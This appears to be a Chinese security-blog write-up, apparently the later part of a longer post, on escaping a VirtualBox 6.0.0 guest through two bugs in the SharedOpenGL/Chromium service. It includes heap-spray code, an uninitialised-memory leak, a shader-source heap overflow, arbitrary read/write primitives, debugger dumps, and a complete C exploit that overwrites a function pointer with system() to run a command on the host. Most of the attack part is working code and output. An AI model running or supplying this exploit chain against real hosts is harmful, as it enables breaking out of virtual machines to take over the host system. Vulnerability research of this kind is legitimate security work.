我们首先申请N个这么些大小的堆，用于消耗内存碎片

    
    
       //heap spray
       for (int i=0;i<600;i++) {
          alloc_buf(client,0x298,"CRConnection_size_fill",23);
       }
       for (int i=0;i<600;i++) {
          alloc_buf(client,0x9d0,"CRClient_size_fill",23);
       }
    

然后接下来建立一个新的`VBoxSharedCrOpenGL`服务，由于前面内存碎片耗尽，此时的`VBoxSharedCrOpenGL`服务申请的`CRClient`和`CRConnection`很可能相邻

    
    
       //CRClient和CRConnection结构体将被创建
       int new_client = hgcm_connect("VBoxSharedCrOpenGL");
       for (int i=0;i<600;i++) {
          alloc_buf(client,0x298,"CRConnection_size_fill",23);
       }
       for (int i=0;i<600;i++) {
          alloc_buf(client,0x9d0,"CRClient_size_fill",23);
       }
    

接下来，我们将`new_client`释放,然后使用同样大小的crmsg的buf占位，并且控制OPCODE使得程序进入`crUnpackExtendGetUniformLocation`函数

    
    
       //释放CRClient和CRConnection结构体
       hgcm_disconnect(new_client);
    
       uint32_t msg[] = {CR_MESSAGE_OPCODES, //type
                    0x66666666, //conn_id
                    1, //numOpcodes
                    CR_EXTEND_OPCODE << 24,
                    OFFSET_PCLIENT, //packet_length
                    CR_GETUNIFORMLOCATION_EXTEND_OPCODE, //extend opcode
                    0, //program
                    *(uint32_t *)"leak" //name
                    };
       //将crmsg的unpack_buffer申请占位到之前的CRConnection结构体位置，从而进行数据泄露
       crmsg(client,0x298,msg,sizeof(msg));
    

那么此时的`cr_unpackData`与原来`new_client`的空间重合，由于crmsg使用的buf是通过`svcGetBuffer`生成的，而之前分析过`svcGetBuffer`是通过`RTMemAlloc(cbBufferSize);`来申请堆的，`RTMemAlloc`函数不会清除原空间的内容，调试如下

    
    
    In file: /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/unpacker/unpack_shaders.c
       343     cr_unpackDispatch.GetAttribLocation(program, name);
       344 }
       345 
       346 void crUnpackExtendGetUniformLocation(void)
       347 {
     ► 348     int packet_length = READ_DATA(0, int);
       349     GLuint program = READ_DATA(8, GLuint);
       350     const char *name = DATA_POINTER(12, const char);
       351     SET_RETURN_PTR(packet_length-16);
       352     SET_WRITEBACK_PTR(packet_length-8);
       353     cr_unpackDispatch.GetUniformLocation(program, name);
    pwndbg> tel cr_unpackData 100
    00:0000│ rdi 0x7fb89214f080 ◂— 0xa400000248
    01:0008│     0x7fb89214f088 ◂— 0x6b61656c00000000
    02:0010│     0x7fb89214f090 ◂— 0x0
    ... ↓        2 skipped
    05:0028│     0x7fb89214f0a8 ◂— 0xffffffff
    06:0030│     0x7fb89214f0b0 ◂— 0x0
    ... ↓        9 skipped
    10:0080│     0x7fb89214f100 ◂— 0x3e8000003e800
    11:0088│     0x7fb89214f108 ◂— 0x0
    12:0090│     0x7fb89214f110 ◂— 0x0
    13:0098│     0x7fb89214f118 ◂— 0x100000000
    14:00a0│     0x7fb89214f120 ◂— 0x0
    ... ↓        2 skipped
    17:00b8│     0x7fb89214f138 ◂— 0x1b58
    18:00c0│     0x7fb89214f140 —▸ 0x7fb8a5cfc00c (crVBoxHGCMAlloc) ◂— push   rbp
    19:00c8│     0x7fb89214f148 —▸ 0x7fb8a5cfcd4e (crVBoxHGCMFree) ◂— push   rbp
    1a:00d0│     0x7fb89214f150 —▸ 0x7fb8a5cfc982 (crVBoxHGCMSend) ◂— push   rbp
    1b:00d8│     0x7fb89214f158 ◂— 0x0
    

因此这里我们无需用到越界读也能泄露出原来`CRConnection`中的信息，我们泄露出位于`0x248`处的`pClient`地址以后，重新建立了一个新的`VBoxSharedCrOpenGL`服务，以便我们后续劫持该服务中的`CRConnection`中一些函数指针，从而控制程序流程

    
    
       uint64_t client_addr = *(uint64_t *)(crmsg_buf+0x10);
       //重新将新的CRClient和CRConnection结构体占位与此
       new_client = hgcm_connect("VBoxSharedCrOpenGL");
       LeakClient lc = {
            .new_client = new_client,
            .client_addr = client_addr
       };
       /*for (int i=0;i<100;i++) {
          printf("%02x ",crmsg_buf[i]);
       }*/
       return lc;
    

###  crUnpackExtendShaderSource

####  分析

现在来看第二个漏洞`crUnpackExtendShaderSource`函数

    
    
    void crUnpackExtendShaderSource(void)
    {
        GLint *length = NULL;
        GLuint shader = READ_DATA(8, GLuint);
        GLsizei count = READ_DATA(12, GLsizei);
        GLint hasNonLocalLen = READ_DATA(16, GLsizei);
        GLint *pLocalLength = DATA_POINTER(20, GLint);
        char **ppStrings = NULL;
        GLsizei i, j, jUpTo;
        int pos, pos_check;
    
        if (count >= UINT32_MAX / sizeof(char *) / 4)
        {
            crError("crUnpackExtendShaderSource: count %u is out of range", count);
            return;
        }
    
        pos = 20 + count * sizeof(*pLocalLength);
    
        if (hasNonLocalLen > 0)
        {
            length = DATA_POINTER(pos, GLint);
            pos += count * sizeof(*length);
        }
    
        pos_check = pos;
    
        if (!DATA_POINTER_CHECK(pos_check))
        {
            crError("crUnpackExtendShaderSource: pos %d is out of range", pos_check);
            return;
        }
    
        for (i = 0; i < count; ++i)
        {
            if (pLocalLength[i] <= 0 || pos_check >= INT32_MAX - pLocalLength[i] || !DATA_POINTER_CHECK(pos_check))
            {
                crError("crUnpackExtendShaderSource: pos %d is out of range", pos_check);
                return;
            }
    
            pos_check += pLocalLength[i];
        }
    
        ppStrings = crAlloc(count * sizeof(char*));
        if (!ppStrings) return;
    
        for (i = 0; i < count; ++i)
        {
            ppStrings[i] = DATA_POINTER(pos, char);
            pos += pLocalLength[i];
            if (!length)
            {
                pLocalLength[i] -= 1;
            }
    
            Assert(pLocalLength[i] > 0);
            jUpTo = i == count -1 ? pLocalLength[i] - 1 : pLocalLength[i];
            for (j = 0; j < jUpTo; ++j)
            {
                char *pString = ppStrings[i];
    
                if (pString[j] == '\0')
                {
                    Assert(j == jUpTo - 1);
                    pString[j] = '\n';
                }
            }
        }
    
    //    cr_unpackDispatch.ShaderSource(shader, count, ppStrings, length ? length : pLocalLength);
        cr_unpackDispatch.ShaderSource(shader, 1, (const char**)ppStrings, 0);
    
        crFree(ppStrings);
    }
    

该函数的中间的一个循环，每次循环开始，检查前一次累加出的pos_check是否越界，显然经过这样的检查，`pos_check`肯定在`INT32_MAX`范围内，但是后一个范围即`DATA_POINTER_CHECK(pos_check)`的检查则不一定了

    
    
    for (i = 0; i < count; ++i)
        {
            if (pLocalLength[i] <= 0 || pos_check >= INT32_MAX - pLocalLength[i] || !DATA_POINTER_CHECK(pos_check))
            {
                crError("crUnpackExtendShaderSource: pos %d is out of range", pos_check);
                return;
            }
            pos_check += pLocalLength[i];
        }
    

因为对于最后一次的循环，`pLocalLength[i];`可以为任意大小的值，将其累加到`pos_check`上面以后，就退出了循环，没有再次检查`pos_check`是否还在`DATA_POINTER`范围内。由于上述的检查不充分，下方的循环将导致溢出

    
    
            Assert(pLocalLength[i] > 0);
            jUpTo = i == count -1 ? pLocalLength[i] - 1 : pLocalLength[i];
            for (j = 0; j < jUpTo; ++j)
            {
                char *pString = ppStrings[i];
    
                if (pString[j] == '\0')
                {
                    Assert(j == jUpTo - 1);
                    pString[j] = '\n';
                }
            }
    

虽然存在`Assert(j == jUpTo -1);`的检查，但是对于`release`版本，在编译时`Assert`会被去掉。因此，上述代码可以溢出指定长度，并将后方为空字节的数据替换为`\n`。

####  利用

对于这种溢出，一个好的利用方式就是通过它将\0替换为\n的特性将某些类似于Buffer的对象的length修改，从而使得该Buffer能够越界溢出，进而控制其他对象。  
前面`SHCRGL_GUEST_FN_WRITE_BUFFER`命令创建的`CRVBOXSVCBUFFER_t`对象是一个很好的选择，该对象结构如下

    
    
    typedef struct _CRVBOXSVCBUFFER_t {
        uint32_t uiId;
        uint32_t uiSize;
        void*    pData;
        _CRVBOXSVCBUFFER_t *pNext, *pPrev;
    } CRVBOXSVCBUFFER_t;
    

将该对象布局到`cr_unpackData`后方，通过溢出，可以将`CRVBOXSVCBUFFER_t`中的`uiSize`改大，从而使得该`CRVBOXSVCBUFFER_t`能够溢出。假设在该`CRVBOXSVCBUFFER_t`的`pData`指向的内存后方还有一个`CRVBOXSVCBUFFER_t`,那么通过溢出，可以控制后面整个`CRVBOXSVCBUFFER_t`，从而实现任意地址读写。  
首先通过申请大量的`Buffer`，消耗内存碎片，最后申请的几个Buffer就很大可能连续

    
    
       uint32_t msg[] = {CR_MESSAGE_OPCODES, //type
                    0x66666666, //conn_id
                    1, //numOpcodes
                    CR_EXTEND_OPCODE << 24,
                    0x12345678,
                    CR_SHADERSOURCE_EXTEND_OPCODE, //extend opcode
                    0, //shader
                    2, //count
                    0, //hasNonLocalLen
                    0x1,0x100, // *pLocalLength
                    0x12345678 //padding
                    };
       for (int i=0;i<0x1000-0x4;i++) {
           alloc_buf(client,sizeof(msg),"heap fengshui",23);
       }
       int buf1 = alloc_buf(client,sizeof(msg),msg,sizeof(msg));
       int buf2 = alloc_buf(client,sizeof(msg),"aaaaaaaaaaaaa",sizeof(msg));
       int buf3 = alloc_buf(client,sizeof(msg),"bbbbbbbbbbbbb",sizeof(msg));
       int buf4 = alloc_buf(client,sizeof(msg),"ccccccccccccc",sizeof(msg));
       crmsg_with_bufid(client,buf1);
    

如上代码，我们选择buf1作为`cr_unpackData`，想要通过buf1溢出修改buf2的`uiSize`，调试如下

    
    
    In file: /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/unpacker/unpack_shaders.c
       79     if (!ppStrings) return;
       80 
       81     for (i = 0; i < count; ++i)
       82     {
       83         ppStrings[i] = DATA_POINTER(pos, char);
     ► 84         pos += pLocalLength[i];
       85         if (!length)
       86         {
       87             pLocalLength[i] -= 1;
       88         }
       89 
    pwndbg> x /2gx ppStrings
    0x7fb890f34ed0:    0x00007fb893001fcc    0x00007fb893001fcd
    pwndbg> x /20gx 0x00007fb893001fcd
    0x7fb893001fcd:    0x0000000000123456    0x0000000035000000
    0x7fb893001fdd:    0x3000007b06000000    0xb893002010000000
    0x7fb893001fed:    0xb893001f7000007f    0xb89300205000007f
    0x7fb893001ffd:    0x000000000000007f    0x0000000045000000
    0x7fb89300200d:    0x6161616161000000    0x6161616161616161
    0x7fb89300201d:    0x6262626262626200    0x6300626262626262
    0x7fb89300202d:    0x6363636363636363    0x4364690063636363
    0x7fb89300203d:    0x000000000065696c    0x0000000035000000
    0x7fb89300204d:    0x3000007b07000000    0xb893002080000000
    0x7fb89300205d:    0xb893001fe000007f    0xb8930020c000007f
    

通过上面调试的数据，可以知道，我们的堆风水已经弄好了，现在就是溢出，修改buf2的`uiSize`，我们先通过调试，确定精确的溢出偏移大小，仅达到修改`uiSize`，保证其后面的数据不被破坏

    
    
    In file: /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/unpacker/unpack_shaders.c
        91         jUpTo = i == count -1 ? pLocalLength[i] - 1 : pLocalLength[i];
        92         for (j = 0; j < jUpTo; ++j)
        93         {
        94             char *pString = ppStrings[i];
        95 
     ►  96             if (pString[j] == '\0')
        97             {
        98                 Assert(j == jUpTo - 1);
        99                 pString[j] = '\n';
       100             }
       101         }
    pwndbg> x /20wx pString+0x3
    0x7fb893001fd0:    0x00000000    0x00000000    0x00000035    0x00000000
    0x7fb893001fe0:    0x00007b06    0x00000030    0x93002010    0x00007fb8
    0x7fb893001ff0:    0x93001f70    0x00007fb8    0x93002050    0x00007fb8
    0x7fb893002000:    0x00000000    0x00000000    0x00000045    0x00000000
    0x7fb893002010:    0x61616161    0x61616161    0x61616161    0x62620061
    

我们确定出修改`uiSize`需要0x1B的偏移

![](https://p3.ssl.qhimg.com/t0176e1335808b0ee43.png)

如图，buf2的`uiSize`已经成功被修改，现在我们就可以利用buf2修改buf3的`CRVBOXSVCBUFFER_t`结构体，构造任意地址读写原语。由于此处的堆是通过glibc申请的，因此当我们修改`uiSize`后，glibc堆chunk的头部也已经损坏，此时调用到`svcFreeBuffer(pSvcBuffer);`时，在glibc2.23环境下，虚拟机会发生崩溃。因此我们在ubuntu
1804上进行测试，由于glibc 2.27有tcache机制，不会检查chunk的size因此可以在glibc
2.27及以上完成利用。当在glibc2.27及以上环境时，我们换一种方式来布置堆风水

    
    
       int buf1,buf2,buf3,buf4;
       for (int i=0;i<0x4000;i++) {
           buf1 = alloc_buf(client,sizeof(msg),msg,sizeof(msg));
           buf2 = alloc_buf(client,sizeof(msg),"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",sizeof(msg));
           buf3 = alloc_buf(client,sizeof(msg),"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",sizeof(msg));
           buf4 = alloc_buf(client,sizeof(msg),"cccccccccccccccccccccccccccccccccccccc",sizeof(msg));
       }
       crmsg_with_bufid(client,buf1);
    

这样使得buf1、buf2、buf3、buf4相邻的可能比较大。  
现在，我们已经可以通过buf2来控制整个buf3的`CRVBOXSVCBUFFER_t`了，那么我们可以构造出任意地址写的原语

    
    
    int arb_write(int client,uint64_t addr,uint32_t size,void *buf) {
       ArbWrite data = {
          .size = size,
          .addr = addr
       };
       //set CRVBOXSVCBUFFER_t's pData and size
       write_buf(client,oob_buf,0xa30,0x44,&data,sizeof(data));
       //arb write
       write_buf(client,arb_buf,size,0,buf,size);
       return 0;
    }
    

有了任意地址写的原语以后，我们就要考虑如何构造任意地址读的原语。在`svcCall`中，有一条命令`SHCRGL_GUEST_FN_READ`，

    
    
           case SHCRGL_GUEST_FN_READ:
            {
    .........
                /* Fetch parameters. */
                uint8_t *pBuffer  = (uint8_t *)paParms[0].u.pointer.addr;
                uint32_t cbBuffer = paParms[0].u.pointer.size;
    
                /* Execute the function. */
                rc = crVBoxServerClientRead(u32ClientID, pBuffer, &cbBuffer);
    

该命令会调用`crVBoxServerClientRead`函数，进一步进入`crVBoxServerInternalClientRead`函数

    
    
    int32_t crVBoxServerInternalClientRead(CRClient *pClient, uint8_t *pBuffer, uint32_t *pcbBuffer)
    {
        if (pClient->conn->cbHostBuffer > *pcbBuffer)
        {
            crDebug("crServer: [%lx] ClientRead u32ClientID=%d FAIL, host buffer too small %d of %d",
                      crThreadID(), pClient->conn->u32ClientID, *pcbBuffer, pClient->conn->cbHostBuffer);
    
            /* Return the size of needed buffer */
            *pcbBuffer = pClient->conn->cbHostBuffer;
    
            return VERR_BUFFER_OVERFLOW;
        }
    
        *pcbBuffer = pClient->conn->cbHostBuffer;
    
        if (*pcbBuffer)
        {
            CRASSERT(pClient->conn->pHostBuffer);
    
            crMemcpy(pBuffer, pClient->conn->pHostBuffer, *pcbBuffer);
            pClient->conn->cbHostBuffer = 0;
        }
    
        return VINF_SUCCESS;
    }
    

关键的一句代码`crMemcpy(pBuffer, pClient->conn->pHostBuffer,
*pcbBuffer);`，可见该命令的作用是将`pClient->conn->pHostBuffer`中的内容拷贝给Guest，由于现在我们实现了任意地址写，并且`pClient->conn`的地址也已经知道，那么我们可以控制`pHostBuffer`，从而实现任意地址读。

    
    
    int arb_read(int client,uint64_t conn_addr,uint64_t addr,uint32_t size,void *buf) {
       //设置pHostBuffer为目的地址
       arb_write(client,conn_addr+OFFSET_CONN_HOSTBUF,0x8,&addr);
       //设置size
       arb_write(client,conn_addr+OFFSET_CONN_HOSTBUFSZ,0x4,&size);
       //通过SHCRGL_GUEST_FN_READ命令读取pHostBuffer指向的内容
       return read_hostbuf(client,0x100,buf);
    }
    

现在利用任意地址读，泄露出`CRConnection`中的函数指针

    
    
       //读取函数指针，泄露地址
       arb_read(new_client,conn_addr,conn_addr + OFFSET_ALLOC_FUNC_PTR,8,buff);
       uint64_t alloc_addr = *((uint64_t *)buff);
       printf("alloc_addr=0x%lx\n",alloc_addr);
    

当我们调试时，发现当我们的程序运行完毕以后，虚拟机就是崩溃

    
    
    pwndbg> k
    #0  __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:51
    #1  0x00007f0b1da41921 in __GI_abort () at abort.c:79
    #2  0x00007f0b1da8a967 in __libc_message (action=action@entry=do_abort, fmt=fmt@entry=0x7f0b1dbb7b0d "%s\n") at ../sysdeps/posix/libc_fatal.c:181
    #3  0x00007f0b1da919da in malloc_printerr (str=str@entry=0x7f0b1dbb9818 "double free or corruption (out)") at malloc.c:5342
    #4  0x00007f0b1da98f6a in _int_free (have_lock=0, p=0x7f0abb1470a0, av=0x7f0b1ddecc40 <main_arena>) at malloc.c:4308
    #5  __GI___libc_free (mem=0x7f0abb1470b0) at malloc.c:3134
    #6  0x00007f0b2051da8f in RTMemFree (pv=<optimized out>) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/r3/alloc.cpp:262
    #7  0x00007f0abaf25c4f in crFree (ptr=<optimized out>) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/mem.c:128
    #8  0x00007f0abaf385c9 in _crVBoxCommonDoDisconnectLocked (conn=0x7f0a04b05f50) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/vboxhgcm.c:1370
    #9  crVBoxHGCMDoDisconnect (conn=0x7f0a04b05f50) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/vboxhgcm.c:1412
    #10 0x00007f0abb171909 in crVBoxServerRemoveClientObj (pClient=0x7f0a05bd8d70) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserverlib/server_main.c:677
    #11 crVBoxServerRemoveClient (u32ClientID=43) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserverlib/server_main.c:716
    #12 0x00007f0abb160945 in svcDisconnect (u32ClientID=<optimized out>, pvClient=<optimized out>) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserver/crservice.cpp:144
    #13 0x00007f0afdaa1eb4 in hgcmServiceThread (pThread=0x7f0ab0003a60, pvUser=0x7f0ab0003900) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCM.cpp:684
    #14 0x00007f0afda9fd5f in hgcmWorkerThreadFunc (hThreadSelf=<optimized out>, pvUser=0x7f0ab0003a60) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCMThread.cpp:200
    #15 0x00007f0b204b5e7c in rtThreadMain (pThread=pThread@entry=0x7f0ab0003c90, NativeThread=NativeThread@entry=139684077311744, pszThreadName=pszThreadName@entry=0x7f0ab0004570 "ShCrOpenGL") at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/common/misc/thread.cpp:719
    

通过栈回溯发现，是因为`pHostBuffer`在`disconnect`时，被`free`了，由于`pHostBuffer`被我们指向了任意地址，因此不会是一个合法的`chunk`。但是想到我们并没有对`HGCM`进行`disconnect`操作，经过研究发现只要我们的程序结束运行，`HGCM`就会自动断开。因此解决方法有很多，一种是不让我们的程序结束，结尾放一个死循环；另一种是将`disconnect`函数指针指向附近的`retn`指令，使得执行该指令时什么都不做。这里我使用的是第二种方法，因此我们的任意地址读原语

    
    
    int arb_read(int client,uint64_t conn_addr,uint64_t addr,uint32_t size,void *buf) {
       char val = 0x64;
       //防止disconnect时free pHostBuffer时崩溃，我们将disconnect函数指针指向附近的retn指令处
       arb_write(client,conn_addr+OFFSET_DISCONN_FUNC_PTR,0x1,&val);
       //设置pHostBuffer为目的地址
       arb_write(client,conn_addr+OFFSET_CONN_HOSTBUF,0x8,&addr);
       //设置size
       arb_write(client,conn_addr+OFFSET_CONN_HOSTBUFSZ,0x4,&size);
       //通过SHCRGL_GUEST_FN_READ命令读取pHostBuffer指向的内容
       stop();
       return read_hostbuf(client,0x100,buf);
    }
    

###  getshell

    
    
    #include <stdio.h>
    #include <stdint.h>
    #include <string.h>
    #include <unistd.h>
    #include "chromium.h"
    #include "hgcm.h"
    
    #define OFFSET_ALLOC_FUNC_PTR 0xD0
    #define OFFSET_DISCONN_FUNC_PTR 0x128
    #define OFFSET_PCLIENT 0x248
    #define CRVBOXSVCBUFFER_SIZE 0x20
    #define OFFSET_CONN_HOSTBUF 0x238
    #define OFFSET_CONN_HOSTBUFSZ 0x244
    
    typedef struct LeakClient {
       int new_client;
       uint64_t client_addr;
       uint64_t conn_addr;
    } LeakClient;
    
    typedef struct ArbWrite {
       uint32_t size;
       uint64_t addr;
    } ArbWrite;
    
    LeakClient leak_client(int client) {
       //heap spray
       for (int i=0;i<600;i++) {
          alloc_buf(client,0x298,"CRConnection_size_fill",23);
       }
       for (int i=0;i<600;i++) {
          alloc_buf(client,0x9d0,"CRClient_size_fill",23);
       }
       //CRClient和CRConnection结构体将被创建
       int new_client = hgcm_connect("VBoxSharedCrOpenGL");
       for (int i=0;i<600;i++) {
          alloc_buf(client,0x298,"CRConnection_size_fill",23);
       }
       for (int i=0;i<600;i++) {
          alloc_buf(client,0x9d0,"CRClient_size_fill",23);
       }
    
       //释放CRClient和CRConnection结构体
       hgcm_disconnect(new_client);
    
       uint32_t msg[] = {CR_MESSAGE_OPCODES, //type
                    0x66666666, //conn_id
                    1, //numOpcodes
                    CR_EXTEND_OPCODE << 24,
                    OFFSET_PCLIENT, //packet_length
                    CR_GETUNIFORMLOCATION_EXTEND_OPCODE, //extend opcode
                    0, //program
                    *(uint32_t *)"leak" //name
                    };
       //将crmsg的unpack_buffer申请占位到之前的CRConnection结构体位置，从而进行数据泄露
       crmsg(client,0x298,msg,sizeof(msg));
    
       uint64_t client_addr = *(uint64_t *)(crmsg_buf+0x10);
       uint64_t conn_addr = client_addr +  0x9e0;
       //重新将新的CRClient和CRConnection结构体占位与此
       new_client = hgcm_connect("VBoxSharedCrOpenGL");
       LeakClient lc = {
            .new_client = new_client,
            .client_addr = client_addr,
            .conn_addr = conn_addr
       };
       return lc;
    }
    
    int stop() {
       char buf[0x10];
       write(1,"stop",0x5);
       read(0,buf,0x10);
    }
    
    int oob_buf;
    int arb_buf;
    
    int make_oob_buf(int client) {
       uint32_t msg[] = {CR_MESSAGE_OPCODES, //type
                    0x66666666, //conn_id
                    1, //numOpcodes
                    CR_EXTEND_OPCODE << 24,
                    0x12345678,
                    CR_SHADERSOURCE_EXTEND_OPCODE, //extend opcode
                    0, //shader
                    2, //count
                    0, //hasNonLocalLen
                    0x1,0x1B, // *pLocalLength
                    0x12345678 //padding
                    };
       //heap spray
       int buf1,buf2,buf3,buf4;
       for (int i=0;i<0x5000;i++) {
           buf1 = alloc_buf(client,sizeof(msg),msg,sizeof(msg));
           buf2 = alloc_buf(client,sizeof(msg),"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",sizeof(msg));
           buf3 = alloc_buf(client,sizeof(msg),"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",sizeof(msg));
           buf4 = alloc_buf(client,sizeof(msg),"cccccccccccccccccccccccccccccccccccccc",sizeof(msg));
       }
       crmsg_with_bufid(client,buf1);
       //generate a new id
       char *buf2_id = (char *)&buf2;
       for (int i=0;i<4;i++) {
          if (buf2_id[i] == '\0') buf2_id[i] = '\n';
       }
       //now buf2 was corrupted
       oob_buf = buf2;
       arb_buf = buf3;
       return 0;
    }
    
    int arb_write(int client,uint64_t addr,uint32_t size,void *buf) {
       ArbWrite data = {
          .size = size,
          .addr = addr
       };
       //set CRVBOXSVCBUFFER_t's pData and size
       write_buf(client,oob_buf,0xa30,0x44,&data,sizeof(data));
       //arb write
       write_buf(client,arb_buf,size,0,buf,size);
       return 0;
    }
    
    int arb_read(int client,uint64_t conn_addr,uint64_t addr,uint32_t size,void *buf) {
       char val = 0x64;
       //防止disconnect时free pHostBuffer时崩溃，我们将disconnect函数指针指向附近的retn指令处
       arb_write(client,conn_addr+OFFSET_DISCONN_FUNC_PTR,0x1,&val);
       //设置pHostBuffer为目的地址
       arb_write(client,conn_addr+OFFSET_CONN_HOSTBUF,0x8,&addr);
       //设置size
       arb_write(client,conn_addr+OFFSET_CONN_HOSTBUFSZ,0x4,&size);
       //通过SHCRGL_GUEST_FN_READ命令读取pHostBuffer指向的内容
       stop();
       return read_hostbuf(client,0x100,buf);
    }
    
    unsigned char buff[0x100] = {0};
    
    int main() {
       int idClient = hgcm_connect("VBoxSharedCrOpenGL");
       printf("idClient=%d\n",idClient);
       set_version(idClient);
       //泄露出CRConnection的地址
       LeakClient leak = leak_client(idClient);
    
       int new_client = leak.new_client;
       set_version(new_client);
       uint64_t conn_addr = leak.conn_addr;
       printf("new_client=%d new_client's CRClient addr=0x%lx CRConnection addr=0x%lx\n",new_client,leak.client_addr,conn_addr);
       //制造OOB对象
       make_oob_buf(new_client);
       hgcm_disconnect(idClient);
       //读取函数指针，泄露地址
       arb_read(new_client,conn_addr,conn_addr + OFFSET_ALLOC_FUNC_PTR,8,buff);
       uint64_t alloc_addr = *((uint64_t *)buff);
       printf("alloc_addr=0x%lx\n",alloc_addr);
       uint64_t VBoxOGLhostcrutil_base = alloc_addr - 0x209d0;
       uint64_t abort_got = VBoxOGLhostcrutil_base + 0x22F0B0;
       arb_read(new_client,conn_addr,abort_got,8,buff);
       uint64_t abort_addr = *((uint64_t *)buff);
       printf("abort_addr=0x%lx\n",abort_addr);
       uint64_t libc_base = abort_addr - 0x407e0;
       uint64_t system_addr = libc_base + 0x4f550;
       printf("libc_base=0x%lx\n",libc_base);
       printf("system_addr=0x%lx\n",system_addr);
       //修改disconnect函数指针为system地址
       arb_write(new_client,conn_addr+OFFSET_DISCONN_FUNC_PTR,0x8,&system_addr);
       char *cmd = "/usr/bin/galculator";
       arb_write(new_client,conn_addr,strlen(cmd)+1,cmd);
       //getshell
       hgcm_disconnect(new_client);
    }
    

效果如下

![](https://p2.ssl.qhimg.com/t01d4f4ea243c892bc6.png)

有关我前面分析到的`HGCM`协议和`Chromium`协议使用的C语言版的3dpwn库在我的[github](https://github.com/ha1vk/3dpwn_c)，欢迎大家来个star。

## 0x03 感想

第一次完成了VirtualBox的虚拟机逃逸，收获很多，成就感也很大。在安全研究的这条路上还要走很远，加油。

## 0x04 参考

[Breaking Out of VirtualBox through 3D
Acceleration](https://www.coresecurity.com/sites/default/files/private-files/publications/2016/05/corelabs-Breaking_Out_of_VirtualBox_through_3D_Acceleration-Francisco_Falcon.pdf)  
[48小时逃逸Virtualbox虚拟机——记一次CTF中的0day之旅](https://zhuanlan.zhihu.com/p/58910752)  
[Virtual-Box-Exploitation-2](https://matshao.com/2019/05/20/Virtual-Box-Exploitation-2/)  
[Better slow than sorry – VirtualBox 3D acceleration considered
harmful](https://phoenhex.re/2018-07-27/better-slow-than-sorry)  
[利用Chromium漏洞夺取CTF胜利：VitualBox虚拟机逃逸漏洞分析（CVE-2019-2446）](https://blog.csdn.net/systemino/article/details/89716780)  
[3dpwn](https://github.com/niklasb/3dpwn)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **ha1vk@赛宁网安天虞实验室** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/239241](/post/id/239241)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [二进制安全](/tag/二进制安全)
  * [虚拟机逃逸](/tag/虚拟机逃逸)
  * [VirualBox逃逸](/tag/VirualBox逃逸)

 **+1** __8赞

 __收藏

![](https://p5.ssl.qhimg.com/t015704b4b2e374eb33.jpg) ha1vk@赛宁网安天虞实验室

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

